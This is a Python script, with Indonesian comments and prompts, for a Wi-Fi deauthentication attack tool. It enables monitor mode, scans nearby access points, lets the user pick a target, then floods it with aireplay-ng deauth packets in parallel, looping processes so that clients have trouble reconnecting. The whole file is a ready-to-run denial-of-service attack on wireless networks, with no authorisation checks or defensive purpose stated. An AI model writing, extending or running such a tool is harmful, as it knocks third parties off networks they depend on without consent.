#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Key WiFi - Improved Deauth Tool
Versi lebih stabil + serangan lebih lama
"""

import subprocess
import re
import csv
import os
import sys
import time
import shutil
from datetime import datetime
from pathlib import Path

# ==================== COLORS ====================
class Color:
    RESET = "\033[0m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    CYAN = "\033[36m"
    BOLD_RED = "\033[1;31m"
    BOLD_GREEN = "\033[1;32m"
    BOLD_YELLOW = "\033[1;33m"
    BOLD_CYAN = "\033[1;36m"

C = Color

def clear():
    os.system("clear" if os.name != "nt" else "cls")

def banner():
    print(f"""{C.BOLD_RED}
 ██ ▄█▀ ▓█████▓██   ██▓
 ██▄█▒  ▓█   ▀ ▒██  ██▒
▓███▄░  ▒███    ▒██ ██░
▓██ █▄  ▒▓█  ▄  ░ ▐██▓░
▒██▒ █▄ ░▒████▒ ░ ██▒▓░
▒ ▒▒ ▓▒ ░░ ▒░ ░  ██▒▒▒ 
░ ░▒ ▒░  ░ ░  ░▓██ ░▒░ 
░ ░░ ░     ░   ▒ ▒ ░░  
░  ░       ░  ░░ ░     
               ░ ░     
{C.BOLD_CYAN}        Key WiFi Deauth Tool
{C.YELLOW}        Improved + Longer Attack Version
{C.RESET}""")

def info(msg):
    print(f"{C.YELLOW}[*]{C.RESET} {msg}")

def success(msg):
    print(f"{C.GREEN}[+]{C.RESET} {msg}")

def error(msg):
    print(f"{C.RED}[!]{C.RESET} {msg}")

def warn(msg):
    print(f"{C.BOLD_YELLOW}[!]{C.RESET} {msg}")

# ==================== UTILS ====================
def is_root():
    return os.geteuid() == 0

def timestamp():
    return datetime.now().strftime("%Y%m%d-%H%M%S")

def backup_csv():
    backup_dir = Path("backup")
    backup_dir.mkdir(exist_ok=True)
    for f in Path(".").glob("*.csv"):
        try:
            dest = backup_dir / f"{timestamp()}-{f.name}"
            shutil.move(str(f), dest)
            success(f"Backup {f.name} → {dest}")
        except Exception:
            pass

# ==================== INTERFACE ====================
def get_interfaces():
    interfaces = []

    # 1. iw dev
    try:
        out = subprocess.run(["iw", "dev"], capture_output=True, text=True).stdout
        found = re.findall(r"Interface\s+(\S+)", out)
        for iface in found:
            if iface not in interfaces:
                interfaces.append(iface)
    except Exception:
        pass

    # 2. ip link
    if not interfaces:
        try:
            out = subprocess.run(["ip", "link", "show"], capture_output=True, text=True).stdout
            found = re.findall(r"\d+:\s+([^:]+):", out)
            for name in found:
                if any(name.startswith(p) for p in ("wl", "wlan", "wlp", "wlx")):
                    if name not in interfaces:
                        interfaces.append(name)
        except Exception:
            pass

    # 3. iwconfig (fallback)
    if not interfaces:
        try:
            out = subprocess.run(["iwconfig"], capture_output=True, text=True).stdout
            found = re.findall(r"^(wlan\d+|wlp\S+|wlx\S+)", out, re.MULTILINE)
            for iface in found:
                if iface not in interfaces:
                    interfaces.append(iface)
        except Exception:
            pass

    return interfaces

def get_monitor_iface(base_iface):
    try:
        out = subprocess.run(["ip", "link", "show"], capture_output=True, text=True).stdout
    except Exception:
        out = ""

    candidates = [
        f"{base_iface}mon",
        f"mon{base_iface}",
        *[f"mon{i}" for i in range(0, 6)]
    ]

    for line in out.splitlines():
        match = re.match(r"\d+:\s+([^:]+):", line)
        if match:
            name = match.group(1)
            if "mon" in name.lower() and name not in candidates:
                candidates.append(name)

    for cand in candidates:
        if re.search(rf"\b{re.escape(cand)}\b", out):
            return cand

    return base_iface

# ==================== MONITOR MODE ====================
def enable_monitor(iface):
    info("Mengaktifkan monitor mode...")
    subprocess.call(["airmon-ng", "check", "kill"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call(["airmon-ng", "start", iface],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    time.sleep(1.2)
    mon = get_monitor_iface(iface)
    success(f"Monitor interface: {mon}")
    return mon

def disable_monitor(mon_iface):
    info("Mematikan monitor mode...")
    subprocess.call(["airmon-ng", "stop", mon_iface],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.call(["systemctl", "restart", "NetworkManager"],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    success("Kembali ke mode managed")

# ==================== SCAN ====================
def read_networks(csv_file):
    fields = [
        'BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed',
        'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV',
        'LAN_IP', 'ID_length', 'ESSID', 'Key'
    ]
    networks = []
    try:
        with open(csv_file, newline='', errors='ignore') as f:
            reader = csv.DictReader(f, fieldnames=fields)
            for row in reader:
                bssid = row.get("BSSID", "").strip()
                if bssid in ("BSSID", "Station MAC") or not bssid:
                    if bssid == "Station MAC":
                        break
                    continue
                networks.append(row)
    except Exception:
        pass

    # Deduplicate
    seen = set()
    unique = []
    for net in networks:
        bssid = net.get("BSSID")
        if bssid and bssid not in seen:
            seen.add(bssid)
            unique.append(net)
    return unique

def show_table(networks):
    print(f"\n{C.BOLD_YELLOW}{'NO':<4}{'BSSID':<20}{'CH':<5}{'PWR':<6}{'ENC':<10}{'ESSID'}{C.RESET}")
    print("─" * 72)
    for i, net in enumerate(networks):
        essid = net.get("ESSID") or "<hidden>"
        ch = (net.get("channel") or "").strip()
        pwr = (net.get("Power") or "").strip()
        enc = (net.get("Privacy") or "").strip()
        print(f"{i:<4}{net.get('BSSID',''):<20}{ch:<5}{pwr:<6}{enc:<10}{essid}")

# ==================== DEAUTH (LEBIH LAMA) ====================
def run_deauth(mon_iface, bssid, channel, essid):
    clear()
    banner()
    print(f"{C.BOLD_RED}══════════════ DEAUTH MODE (LONG ATTACK) ══════════════{C.RESET}")
    print(f" Target   : {C.BOLD_GREEN}{essid}{C.RESET}")
    print(f" BSSID    : {bssid}")
    print(f" Channel  : {channel}")
    print(f" Interface: {mon_iface}")
    print(f"{C.BOLD_RED}═══════════════════════════════════════════════════════{C.RESET}\n")

    # Set channel
    try:
        subprocess.call(["iw", "dev", mon_iface, "set", "channel", str(channel)],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        subprocess.call(["iwconfig", mon_iface, "channel", str(channel)],
                        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    warn("Mode serangan lama aktif — Tekan Ctrl+C untuk berhenti\n")

    processes = []

    try:
        while True:
            # Jalankan 3 proses deauth continuous secara paralel
            for _ in range(3):
                p = subprocess.Popen(
                    ["aireplay-ng", "--deauth", "0", "-a", bssid, mon_iface],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL
                )
                processes.append(p)

            # Biarkan berjalan lebih lama
            time.sleep(10)

            # Hentikan proses lama
            for p in processes:
                try:
                    p.terminate()
                except:
                    pass
            processes.clear()

            # Burst tambahan biar makin susah reconnect
            subprocess.call(
                ["aireplay-ng", "--deauth", "128", "-a", bssid, mon_iface],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

    except KeyboardInterrupt:
        print(f"\n{C.RED}[!] Deauth dihentikan oleh user{C.RESET}")
    finally:
        # Pastikan semua proses mati
        for p in processes:
            try:
                p.terminate()
                p.kill()
            except:
                pass
        disable_monitor(mon_iface)

# ==================== MAIN ====================
def main():
    clear()
    banner()

    if not is_root():
        error("Jalankan dengan sudo/root!")
        print("    Contoh: sudo python3 keywifi.py")
        sys.exit(1)

    backup_csv()

    info("Mendeteksi interface WiFi...")
    interfaces = get_interfaces()

    if not interfaces:
        error("Tidak menemukan interface WiFi.")
        print("    Pastikan adapter terpasang dan install: sudo apt install aircrack-ng iw")
        sys.exit(1)

    print()
    for i, iface in enumerate(interfaces):
        print(f"  {C.GREEN}[{i}]{C.RESET} {iface}")

    # Pilih interface
    while True:
        try:
            choice = input(f"\n{C.YELLOW}[?] Pilih interface: {C.RESET}").strip()
            iface = interfaces[int(choice)]
            break
        except (ValueError, IndexError):
            error("Pilihan tidak valid")
        except KeyboardInterrupt:
            print(f"\n{C.RED}[!] Dibatalkan{C.RESET}")
            sys.exit(0)

    mon_iface = enable_monitor(iface)

    # Mulai scanning
    info("Memulai scanning... Tekan Ctrl+C jika sudah cukup")
    try:
        proc = subprocess.Popen(
            ["airodump-ng", "-w", "scan", "--write-interval", "1",
             "--output-format", "csv", mon_iface],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
    except Exception as e:
        error(f"Gagal menjalankan airodump-ng: {e}")
        disable_monitor(mon_iface)
        sys.exit(1)

    networks = []
    spinner = ["|", "/", "-", "\\"]
    idx = 0

    try:
        while True:
            clear()
            banner()
            print(f"{C.YELLOW}[*] Scanning... {spinner[idx % 4]}  (Ctrl+C untuk berhenti){C.RESET}\n")
            idx += 1

            csv_files = list(Path(".").glob("scan*.csv"))
            if csv_files:
                latest = max(csv_files, key=lambda f: f.stat().st_mtime)
                networks = read_networks(latest)
                if networks:
                    show_table(networks)
                    print(f"\n{C.GREEN}[{len(networks)}] Access Point ditemukan{C.RESET}")
                else:
                    print(f"{C.RED}Belum ada AP terdeteksi...{C.RESET}")
            time.sleep(1.5)
    except KeyboardInterrupt:
        print(f"\n{C.YELLOW}[*] Scanning dihentikan{C.RESET}")

    # Stop airodump
    try:
        proc.terminate()
        proc.wait(timeout=2)
    except Exception:
        proc.kill()

    if not networks:
        error("Tidak ada jaringan yang bisa dipilih")
        disable_monitor(mon_iface)
        sys.exit(1)

    # Pilih target
    while True:
        try:
            sel = input(f"\n{C.YELLOW}[?] Pilih nomor target untuk DEAUTH: {C.RESET}").strip()
            idx = int(sel)
            if 0 <= idx < len(networks):
                break
            error("Nomor di luar jangkauan")
        except ValueError:
            error("Masukkan angka yang valid")
        except KeyboardInterrupt:
            print(f"\n{C.RED}[!] Dibatalkan{C.RESET}")
            disable_monitor(mon_iface)
            sys.exit(0)

    target = networks[idx]
    bssid = target.get("BSSID")
    channel = (target.get("channel") or "").strip()
    essid = target.get("ESSID") or "<hidden>"

    run_deauth(mon_iface, bssid, channel, essid)

if __name__ == "__main__":
    main()
